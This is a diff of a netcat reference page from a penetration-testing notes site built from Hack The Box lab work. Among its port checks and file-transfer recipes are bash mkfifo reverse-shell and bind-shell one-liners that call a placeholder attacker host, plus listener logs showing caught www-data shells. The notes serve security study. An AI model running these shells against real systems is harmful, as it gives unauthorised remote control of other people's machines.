@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/netcat.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Test whether one TCP port accepts a connection
+[Search this tool’s saved examples](/commands/notebook?tool=netcat) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Test whether one TCP port accepts a connection
 
 **Run in:** Kali with OpenBSD netcat. **Requires:** A reachable route and the OpenBSD nc implementation; choose one actual numeric port.
 
@@ -21,120 +29,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 nc -nvz -w 3 TARGET_IP PORT
 ```
 
-**Read the result:** Determine whether this process is a listener or client and whether it carries a terminal or raw file bytes.
-
-**If A TCP handshake succeeds but the application still fails:** Different nc variants support different flags, particularly -e and connection-closing options; a connection alone does not identify the protocol payload.
+**What the result establishes:** Determine whether this process is a listener or client and whether it carries a terminal or raw file bytes.
 
 **Next check:** Use the protocol's own client next; a listening socket does not establish valid credentials or application health.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://man.openbsd.org/nc)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## Netcat / Ncat: choose the operation and read the result
-
-Listen for a connection or transfer a byte stream.
-
-### What the result establishes
-
-Determine whether this process is a listener or client and whether it carries a terminal or raw file bytes.
-
-### Prerequisites and common failures
-
-Different nc variants support different flags, particularly -e and connection-closing options; a connection alone does not identify the protocol payload.
-
-### Example 1: Commands
-
-Run in: **Kali**. A plain TCP connection is not itself a shell; use the Windows/Linux reverse-shell sheet for both sides.
-
-```bash
-nc -lvnp 4444
-nc -nv TARGET_IP PORT
-```
-
-### Example 2: Netcat Listener (Attack Box)
-
-Run in: **Saved lab example**.
-
-```bash
-sudo nc -lvnp 443
-```
-
-Saved context: [Shells, Payloads, and Interactive TTYs — Netcat Listener (Attack Box)](/exploitation/shells-payloads-cheat-sheet#netcat-listener-attack-box). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 3: Bash Reverse Shell One-Liner (Linux Target)
-
-Run in: **Saved lab example**.
-
-```bash
-rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> 7777 > /tmp/f
-```
-
-Saved context: [Shells, Payloads, and Interactive TTYs — Bash Reverse Shell One-Liner (Linux Target)](/exploitation/shells-payloads-cheat-sheet#bash-reverse-shell-one-liner-linux-target). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 4: Raw Netcat Connection (Text Only — Not a Shell)
-
-Run in: **Saved lab example**.
-
-```bash
-# Target (server) — start listener
-nc -lvnp 7777
-
-# Attack box (client) — connect
-nc -nv <TARGET_IP> 7777
-```
-
-Saved context: [Shells, Payloads, and Interactive TTYs — Raw Netcat Connection (Text Only — Not a Shell)](/exploitation/shells-payloads-cheat-sheet#raw-netcat-connection-text-only-—-not-a-shell). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 5: Actual Bind Shell with Netcat
-
-Run in: **Saved lab example**.
-
-```bash
-# Target (server) — bind bash to the TCP listener
-rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <TARGET_IP> 7777 > /tmp/f
-
-# Attack box (client) — connect to get shell
-nc -nv <TARGET_IP> 7777
-```
-
-Saved context: [Shells, Payloads, and Interactive TTYs — Actual Bind Shell with Netcat](/exploitation/shells-payloads-cheat-sheet#actual-bind-shell-with-netcat). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 6: Exploitation steps
-
-Run in: **Saved lab example**.
-
-```bash
-nc -lvnp 9443
-```
-
-Saved context: [HTB Nibbles: Walkthrough and Report — Exploitation steps](/cheatsheets/nibbles#exploitation-steps). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 7: Exploitation steps
-
-Run in: **Saved lab example**.
-
-```bash
-nc -lvnp 8443
-```
-
-Saved context: [HTB Nibbles: Walkthrough and Report — Exploitation steps](/cheatsheets/nibbles#exploitation-steps-2). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## Saved commands and notebook recipes
-
-Listen for a connection or transfer a byte stream.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=netcat) · [All tools](/index)
 
 ## Commands
 
@@ -147,11 +44,15 @@ nc -nv TARGET_IP PORT
 
 A plain TCP connection is not itself a shell; use the Windows/Linux reverse-shell sheet for both sides.
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| A TCP handshake succeeds but the application still fails | Different nc variants support different flags, particularly -e and connection-closing options; a connection alone does not identify the protocol payload. |
 
 ## Notebook recipes
 
-29 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+32 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -195,6 +96,26 @@ nc -lvnp 4444
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Common Services: Personal Assessment Notes — Phase 5 — Upgrading to an Interactive Reverse Shell](/modules/common-services/assessment#phase-5-—-upgrading-to-an-interactive-reverse-shell)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Credential Stealing">
+
+### Credential Stealing
+
+**Cross-Site Scripting (XSS) — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sudo nc -lvnp 80
+listening on [any] 80 ...
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Cross-Site Scripting (XSS) — HTB Module — Credential Stealing](/web/htb/xss#credential-stealing)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -298,7 +219,7 @@ UPLOADING FROM LINUX:
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 6: Quick Decision Tree](/enumeration/citrix-netscaler#example-6-quick-decision-tree) · [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree)
+**Original note sections:** [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -319,6 +240,52 @@ sudo nc -lvnp 8000
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [File Transfers for Linux and Windows — Windows LOLBins](/post-exploitation/file-transfers-cheat-sheet#windows-lolbins)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Generating Custom Reverse Shell Scripts">
+
+### Generating Custom Reverse Shell Scripts
+
+**File Upload Attacks — HTB Module**
+
+```text
+grcic550@htb[/htb]$ nc -lvnp OUR_PORT
+listening on [any] OUR_PORT ...
+connect to [OUR_IP] from (UNKNOWN) [181.151.182.286] 56232
+# id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Upload Attacks — HTB Module — Generating Custom Reverse Shell Scripts](/web/htb/file-upload-attacks#generating-custom-reverse-shell-scripts)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Reverse Shell">
+
+### Reverse Shell
+
+**File Upload Attacks — HTB Module**
+
+```text
+grcic550@htb[/htb]$ nc -lvnp OUR_PORT
+listening on [any] OUR_PORT ...
+connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
+# id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Upload Attacks — HTB Module — Reverse Shell](/web/htb/file-upload-attacks#reverse-shell)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -375,7 +342,7 @@ nc -lvnp 9443
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [HTB Nibbles: Walkthrough and Report — Exploitation steps](/cheatsheets/nibbles#exploitation-steps) · [HTB Nibbles: Walkthrough and Report — Technical walkthrough](/cheatsheets/nibbles#technical-walkthrough)
+**Original note sections:** [HTB Nibbles: Walkthrough and Report — Exploitation steps](/cheatsheets/nibbles#exploitation-steps)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -521,10 +488,34 @@ rsync -av -e "ssh -p2222" rsync://<IP>/<share> ./loot/   # over SSH, custom port
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Linux Remote Access: SSH, Rsync, and R-Services — Example 5: Rsync](/enumeration/linux-remote-management-protocols-cheat-sheet#example-5-rsync) · [Linux Remote Access: SSH, Rsync, and R-Services — Example 2: Rsync](/enumeration/linux-remote-management-protocols-cheat-sheet#example-2-rsync) · [Linux Remote Access: SSH, Rsync, and R-Services — Rsync](/enumeration/linux-remote-management-protocols-cheat-sheet#rsync)
+**Original note sections:** [Linux Remote Access: SSH, Rsync, and R-Services — Rsync](/enumeration/linux-remote-management-protocols-cheat-sheet#rsync)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
+
+</Accordion>
+
+<Accordion title="1. Kali — listener">
+
+### 1. Kali — listener
+
+**Linux → Kali reverse shell**
+
+```bash
+nc -lvnp 7777
+```
+
+</Accordion>
+
+<Accordion title="2. Linux target — connect">
+
+### 2. Linux target — connect
+
+**Linux → Kali reverse shell**
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc LHOST 7777 > /tmp/f
+```
 
 </Accordion>
 
@@ -547,7 +538,7 @@ openssl s_client -connect <IP>:143 -starttls imap     # upgrade plain IMAP to TL
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 2: Connecting by hand](/enumeration/citrix-netscaler#example-2-connecting-by-hand) · [Read and Search Email with POP3 and IMAP — Example 2: Connecting by hand](/enumeration/email-enumeration-manipulation-pop3-imap#example-2-connecting-by-hand) · [Read and Search Email with POP3 and IMAP — Connecting by hand](/enumeration/email-enumeration-manipulation-pop3-imap#connecting-by-hand)
+**Original note sections:** [Read and Search Email with POP3 and IMAP — Connecting by hand](/enumeration/email-enumeration-manipulation-pop3-imap#connecting-by-hand)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -571,6 +562,28 @@ VRFY nonexistentuser123
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Read and Search Email with POP3 and IMAP — Step 0: Enumerate valid usernames over SMTP](/enumeration/email-enumeration-manipulation-pop3-imap#step-0-enumerate-valid-usernames-over-smtp)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Prepare and test the receiving side">
+
+### Prepare and test the receiving side
+
+**Reverse Shell Generators and References**
+
+```bash
+# Workstation:
+nc -lvnp 4444
+ip -br addr
+ss -lntp
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Reverse Shell Generators and References — Prepare and test the receiving side](/exploitation/reverse-shell#prepare-and-test-the-receiving-side)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -651,21 +664,6 @@ nc -nv <TARGET_IP> 7777
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
-**Shells, Payloads, and Interactive TTYs**
-
-Context from the notebook: | nc -l &lt;IP> 7777 Pipe Bash output back through netcat to the attacker
-
-```text
-| nc -l <IP> 7777
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Shells, Payloads, and Interactive TTYs — Actual Bind Shell with Netcat](/exploitation/shells-payloads-cheat-sheet#actual-bind-shell-with-netcat)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
 </Accordion>
 
 <Accordion title="Bash Reverse Shell One-Liner (Linux Target)">
@@ -729,70 +727,23 @@ nc -nv <TARGET_IP> 7777
 
 </Accordion>
 
-<Accordion title="PowerShell Web Uploads">
+<Accordion title="2a. Linux web shell — connect back">
 
-### PowerShell Web Uploads
+### 2a. Linux web shell — connect back
 
-**File Transfers for Linux and Windows**
+**Web shell → terminal**
 
-Context from the notebook: Catch on attack box with  nc -lvnp 8000 , then decode the base64 body.
-
-```text
-nc -lvnp 8000
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc LHOST 443 > /tmp/f
 ```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [File Transfers for Linux and Windows — PowerShell Web Uploads](/post-exploitation/file-transfers-cheat-sheet#powershell-web-uploads)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Windows — Invoke-TheHash (PowerShell)">
-
-### Windows — Invoke-TheHash (PowerShell)
-
-**Pass the Hash from Linux and Windows**
-
-Context from the notebook: The base64 blob is a PowerShell reverse shell (encode one from  Reverse shell  / revshells.com → "PowerShell #3 (Base64)") pointed at your listener. Start a listener ( nc -lvnp &lt;port> ) first.
-
-```text
-nc -lvnp <port>
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Pass the Hash from Linux and Windows — Windows — Invoke-TheHash (PowerShell)](/password-attacks/pass-the-hash#windows-—-invoke-thehash-powershell)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="🚨 THE MTU TRAP">
-
-### 🚨 THE MTU TRAP
-
-**Pivoting and File Transfer: Field Reference**
-
-Context from the notebook: Symptom:  SSH/RDP/PKINIT/LDAPS  connects then hangs , or "Connection reset by peer", while  ping  and  nc -z &lt;port>  succeed.  Cause:  small packets (SYN, ping) pass, but the  large packets  (SSH key exchange, RDP/TLS handshake, a Kerberos AS‑REQ carrying a certificate) exceed the VPN's path MTU, get fragmented, and are dropped.  Fix:
-
-```text
-nc -z <port>
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Pivoting and File Transfer: Field Reference — 🚨 THE MTU TRAP](/cheatsheets/pivoting-file-transfer#-the-mtu-trap)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
 
 </Accordion>
 
 </AccordionGroup>
+
+## Related tools and references
+
+- [Official documentation 1](https://man.openbsd.org/nc)
 
 {/* VAULT_RELATED_START */}
 
@@ -801,5 +752,3 @@ nc -z <port>
 - [Shells, Payloads, and Interactive TTYs](/exploitation/shells-payloads-cheat-sheet)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
